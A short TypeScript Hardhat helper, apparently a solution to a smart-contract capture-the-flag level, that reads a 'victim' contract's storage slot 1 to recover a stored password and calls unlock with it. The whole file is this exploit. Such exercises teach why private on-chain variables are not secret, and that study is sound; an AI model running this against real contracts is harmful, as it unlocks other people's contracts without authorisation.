import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  const password = await ethers.provider.getStorageAt(victim.address, 1);
  await victim.unlock(password);
};

export default helper;
